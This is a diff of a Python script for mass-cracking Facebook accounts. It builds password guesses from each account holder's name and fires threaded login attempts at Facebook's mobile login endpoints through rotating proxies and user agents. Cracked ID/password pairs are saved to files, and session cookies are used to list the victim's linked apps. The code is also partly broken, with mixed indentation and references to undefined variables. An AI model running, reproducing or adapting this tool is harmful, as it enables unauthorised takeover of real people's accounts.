@@ -555,19 +555,15 @@ def menu():
 #-------------[ CRACK-FROM-FILE ]------------------#
 import time
 
-id = []
-id2 = []
-method = []
-
 def crackfile():
     while True:
         print('\033[0;97m-----------------------------------------------')
-        print(' [\u001b[36m•\033[1;37m] Input File Name Without /sdcard/')
-        filename = input(' [\u001b[36m•\033[1;37m] Enter The Name Of File: ')
-        o = '/sdcard/' + filename  # Form the complete file path
+        print(' [\u001b[36m•\033[1;37m] Input File Name Without /sdcard/ ')
+        filename = input(' [\u001b[36m•\033[1;37m] Enter The Name Of File : ')
+        o = '/sdcard/'+filename # Form the complete file path
         try:
             with open(o) as file:
-                lin = file.read().splitlines()
+                lines = file.read().splitlines()
             break  # Exit the loop if the file is successfully opened
         except FileNotFoundError:
             print('\033[0;97m-----------------------------------------------')
@@ -575,14 +571,14 @@ def crackfile():
             input(" Please Press Enter to retry...")
     
     # Assuming `id` is defined elsewhere in your code
-    for xid in lin:
-        id.append(xid)
+    for line in lines:
+        id.append(line)
 
-    setting()
+        setting()
 
 
 #-------------[ PENGATURAN-IDZ ]---------------#
-
+ 
 def setting():
     print('\033[0;97m-----------------------------------------------')
     print(" [\u001b[36m1\033[1;37m] ONLY OLD IDZ")
@@ -590,27 +586,26 @@ def setting():
     print(" [\u001b[36m3\033[1;37m] BOTH MIX IDZ")
     print('\033[0;97m-----------------------------------------------')
     hu = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
-    if hu in ['1', '01']:
+    if hu in ['1','01']:
         for tua in sorted(id):
             id2.append(tua)
-    elif hu in ['2', '02']:
-        muda = [] 
+    elif hu in ['2','02']:
+        muda=[] 
         for bacot in sorted(id):
             muda.append(bacot)
-        bcm = len(muda)
-        bcmi = (bcm - 1)
+        bcm=len(muda)
+        bcmi=(bcm-1)
         for xmud in range(bcm):
             id2.append(muda[bcmi])
-            bcmi -= 1
-    elif hu in ['3', '03']:
+            bcmi -=1
+    elif hu in ['3','03']:
         for bacot in id:
-            xx = random.randint(0, len(id2))
-            id2.insert(xx, bacot)
+            xx = random.randint(0,len(id2))
+            id2.insert(xx,bacot)
     else:
         for bacot in id:
-            xx = random.randint(0, len(id2))
-            id2.insert(xx, bacot)
-    
+            xx = random.randint(0,len(id2))
+            id2.insert(xx,bacot)
     print('\033[0;97m-----------------------------------------------')
     print(" [\u001b[36m•\033[1;37m] LOGIN METHOD ")
     print('\033[0;97m-----------------------------------------------')
@@ -618,53 +613,99 @@ def setting():
     print(" [\u001b[36m2\033[1;37m] METHOD 2")
     print('\033[0;97m-----------------------------------------------')
     hc = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
-    print('\033[0;97m-----------------------------------------------')
-    if hc in ['1', '01']:
+    print('\033[0;97m-----------------------------------------------')                              
+    if hc in ['1','01']:
         method.append('mobile')
-    elif hc in ['2', '02']:
+    elif hc in ['2','02']:
         method.append('free')
     else:
         method.append('mobile')
-    
+        
     print(' [\u001b[36m•\033[1;37m] DO YOU WANT TO SHOW CP IDZ? (Y/N) ')
     print('\033[0;97m-----------------------------------------------')       
     bau = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
     passwrd()
-    exit()
-
-
+    exit() 
+ 
 #-------------------[ BAGIAN-WORDLIST ]------------#
+# Define the banner function
+def banner():
+    # Your implementation of the banner function
+    pass  # Placeholder for the actual implementation
+
+# Define the passwrd function
 def passwrd():
     os.system('clear')
-    print(" \033[1;37m[\u001b[36m•\033[1;37m] YOU STARTED CLONING AT : " + time.strftime("%H:%M"))
-    print(f' [\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[36m{str(len(id))}')
+    print(logo)
+    print(" \033[1;37m[\u001b[36m•\033[1;37m] YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
+    print(f' [\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[36m', str(len(id)))
     print('\033[0;97m-----------------------------------------------')
     print(f' \u001b[36m>> \033[1;37m️USE FLIGHT MODE AFTER 5 MINUTES ')
     print('\033[0;97m-----------------------------------------------')
-
+    
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
-            frs = nmf.split(' ')[0]
             pwv = []
-
+            frs = nmf.split(' ')[0]
+            try:
+                lst = nmf.split(' ')[1]
+            except:
+                lst = ''
+                
             if len(nmf) < 6:
-                if len(frs) >= 3:
-                    pwv.extend([frs + '12', frs + '123', frs + '1234', frs + '12345', nmf, frs + '@123', 
-                                frs + '@1234', frs + '@12345', frs + '@@@', frs + '@#', frs + '123@'])
-            else:
-                if len(frs) >= 3:
-                    pwv.extend([frs + '12', frs + '123', frs + '1234', frs + '12345', nmf, frs + '@123', 
-                                frs + '@1234', frs + '@12345', frs + '@@@', frs + '@#', frs + '123@'])
+                if len(frs) < 3:
+                    pass
                 else:
                     pwv.append(nmf)
+                    pwv.append(frs + lst)
+                    pwv.append(frs + '@' + lst)
+                    pwv.append(frs + '#' + lst)
+                    pwv.append(lst + frs)
+                    pwv.append(frs + '12')
+                    pwv.append(frs + '123')
+                    pwv.append(frs + '321')
+                    pwv.append(frs + '1234')
+                    pwv.append(frs + '12345')
+                    pwv.append(frs + '@123')
+                    pwv.append(frs + '@1234')
+                    pwv.append(frs + lst + '123')
+                    pwv.append(frs + lst + '1234')
+                    pwv.append(frs + lst + '@123')
+                    pwv.append(frs + lst + '@1234')
+                    pwv.append(frs + lst + '321')
+                    pwv.append(lst + frs + '123')
+                    pwv.append(lst + frs + '111')
+            else:
+                if len(frs) < 3:
+                    pwv.append(nmf)
+                else:
+                    pwv.append(nmf)
+                    pwv.append(frs + lst)
+                    pwv.append(frs + '@' + lst)
+                    pwv.append(frs + '#' + lst)
+                    pwv.append(lst + frs)
+                    pwv.append(frs + '12')
+                    pwv.append(frs + '123')
+                    pwv.append(frs + '321')
+                    pwv.append(frs + '1234')
+                    pwv.append(frs + '12345')
+                    pwv.append(frs + '@123')
+                    pwv.append(frs + '@1234')
+                    pwv.append(frs + lst + '123')
+                    pwv.append(frs + lst + '1234')
+                    pwv.append(frs + lst + '@123')
+                    pwv.append(frs + lst + '@1234')
+                    pwv.append(frs + lst + '321')
+                    pwv.append(lst + frs + '123')
+                    pwv.append(lst + frs + '111')
 
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
                     pwv.append(xpwd)
             else:
                 pass
-
+            
             if 'mobile' in method:
                 pool.submit(crack, idf, pwv)
             elif 'free' in method:
@@ -675,22 +716,24 @@ def passwrd():
                 pool.submit(crackfree, idf, pwv)
             else:
                 pool.submit(crackfree, idf, pwv)
-
+    
     print('\033[0;91m-----------------------------------------------')
-    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m' + time.strftime("%H:%M"))
-    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s ' % (ok))
-    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s ' % (cp))
+    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
+    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
+    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
     print('\033[0;91m-----------------------------------------------')
-
+    
     woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
     os.system("python TOXIC.py")
     exit()
 
-# Your other functions go here...
-
-# For the sake of completeness, I've left placeholders for other functions like `crack` and `crackfree`.
 
 #--------------------[ METODE-B-API ]-----------------#
+ 
+import sys
+import random
+import requests
+import re
 
 def crack(idf,pwv):
     global loop, ok, cp
@@ -783,172 +826,69 @@ def crack(idf,pwv):
 
 #------------------[ METHODE-MBASIC-2 ]-------------------#
 
-def crackfree(idf, pwv):
-    global loop
-    global cps
-    global oks
-    global proxy
-    try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_mbasic = {'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=6zsqZlv1F0JB8lDS16pQzU8F; sb=6zsqZkMsyZHPfTG6lZlM84DW; m_pixel_ratio=1.5; wd=1067x480; fr=0A1pJjJlb27rVicOG..BmKjvr..AAA.0.0.BmKjwX.AWXnLXDbzI4; ps_n=1; ps_l=1',
-    'dpr': '1.5',
-    'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '"SM-G998B"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"9.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'pro',}
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_mbasic).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print('\r\r\033[1;32m[INNOCENT-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
-                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
+def crackfree(idf,pwv):
+    global loop,ok,cp
+    sys.stdout.write(f"\r {P}[SUPRAJ-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.flush()
+    ua = random.choice(ugen)
+    ua2 = random.choice(ugen2)
+    ses = requests.Session()
+    for pw in pwv:
+        try:
+            nip=random.choice(prox)
+            proxs= {'http': 'socks5://'+nip}
+            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/login/save-device/'"}
+			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			po = ses.post('https://m.facebook.com/login/device-based/vnisaddate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
+            if "checkpoint" in po.cookies.get_dict().keys():
+            
+                print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
                 cek_apk(session,coki)
-                open('/sdcard/INNOCENT-OK.txt', 'a').write( cid+' | '+ps+'\n')
-                oks.append(cid)
+                open('/sdcard/SUPRAJ-CP.txt', 'a').write(idf+' • '+pw+'\n')
+                akun.append(idf+' • '+pw)
+                cp+=1
                 break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]
-                if 'y' in cp_cpx: 
-                 print('\r\r\033[1;30m[INNOCENT-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
-                open('/sdcard/INNOCENT-CP.txt', 'a').write( cid+' | '+ps+' \n')
-                cps.append(cid)
+            elif "c_user" in ses.cookies.get_dict().keys():
+                ok+=1
+                coki=po.cookies.get_dict()
+                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+                print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
+                open('/sdcard/SUPRAJ-OK.txt', 'a').write(idf+' • '+pw+'\n')
                 break
+                
             else:
                 continue
-        loop+=1
-        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mINNOCENT\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
-        sys.stdout.flush()
-    except:
-        pass
+        except requests.exceptions.ConnectionError:
+            time.sleep(31)
+    loop+=1
 
-
-# def crackfree(idf, pwv):
-#     global loop, ok, cp
-#     sys.stdout.write(f"\r [SUPRAJ-XD] {loop}/{len(id)} OK[{ok}] [{'{:.0%}'.format(loop / float(len(id)))}]  ")
-#     sys.stdout.flush()
-    
-#     ua = random.choice(ugen)
-#     ua2 = random.choice(ugen2)
-#     ses = requests.Session()
-    
-#     for pw in pwv:
-#         try:
-#             nip = random.choice(prox)
-#             header_mbasic = {
-#                 'authority': 'mbasic.facebook.com',
-#                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-#                 'accept-language': 'en-US,en;q=0.9',
-#                 'cache-control': 'max-age=0',
-#                 'dpr': '1.5',
-#                 'sec-ch-prefers-color-scheme': 'dark',
-#                 'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-#                 'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
-#                 'sec-ch-ua-mobile': '?0',
-#                 'sec-ch-ua-model': '"SM-G998B"',
-#                 'sec-ch-ua-platform': '"Android"',
-#                 'sec-ch-ua-platform-version': '"9.0.0"',
-#                 'sec-fetch-dest': 'document',
-#                 'sec-fetch-mode': 'navigate',
-#                 'sec-fetch-site': 'none',
-#                 'sec-fetch-user': '?1',
-#                 'upgrade-insecure-requests': '1',
-#                 'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-#                 'viewport-width': '980',
-#             }
-            
-#             dataa = {
-#                 "lsd": re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
-#                 "jazoest": re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
-#                 "uid": idf,
-#                 "next": "https://p.facebook.com/login/save-device/",
-#                 "flow": "login_no_pin",
-#                 "pass": pw,
-#             }
-            
-#             po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=header_mbasic, allow_redirects=False)
-            
-#             if "checkpoint" in po.cookies.get_dict().keys():
-#                 print(f'\r[CP] {idf} │ {pw}')
-#                 cek_apk(session, coki)
-#                 open('/sdcard/SUPRAJ-CP.txt', 'a').write(idf + ' • ' + pw + '\n')
-#                 cp += 1
-#                 break
-            
-#             elif "c_user" in ses.cookies.get_dict().keys():
-#                 ok += 1
-#                 coki = po.cookies.get_dict()
-#                 print(f'\r[OK] {idf} │ {pw}')
-#                 open('/sdcard/SUPRAJ-OK.txt', 'a').write(idf + ' • ' + pw + '\n')
-#                 break
-                
-#             else:
-#                 continue
-        
-#         except requests.exceptions.ConnectionError:
-#             time.sleep(31)
-#             continue
-        
-#         except Exception as e:
-#             print(f"An error occurred: {e}")
-#             continue
-    
-#     loop += 1
-
-# def cek_apk(session, coki):
-#     try:
-#         w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki}).text
-#         sop = BeautifulSoup(w, "html.parser")
-#         x = sop.find("form", method="post")
-#         game = [i.text for i in x.find_all("h3")]
-#         if len(game) == 0:
-#             print('\rNo Active Apk found')
-#         else:
-#             print('\rYour Active Application Details:')
-#             for i in range(len(game)):
-#                 print(f"{i+1}. {game[i].replace('Ditambahkan pada', 'Ditambahkan pada')}")
-        
-#         w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki}).text
-#         sop = BeautifulSoup(w, "html.parser")
-#         x = sop.find("form", method="post")
-#         game = [i.text for i in x.find_all("h3")]
-#         if len(game) == 0:
-#             print('\rNo Expired Apk found')
-#         else:
-#             print('\rYour Expired Application Details:')
-#             for i in range(len(game)):
-#                 print(f"{i+1}. {game[i].replace('Kedaluwarsa', 'Kedaluwarsa')}")
-    
-#     except Exception as e:
-#         print(f"An error occurred while checking apps: {e}")
-
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+         print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
+    else:
+        print(f'\r 🎮  %sYour Active Application Details :'%(H))
+        for i in range(len(game)):
+            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        #else:
+            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
+    else:
+        print(f'\r 🎮  %sYour Expired Application Details :'%(M))
+        for i in range(len(game)):
+            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print(f'\r')
 
 #-----------------------[ SYSTEM-CONTROL ]--------------------#
  
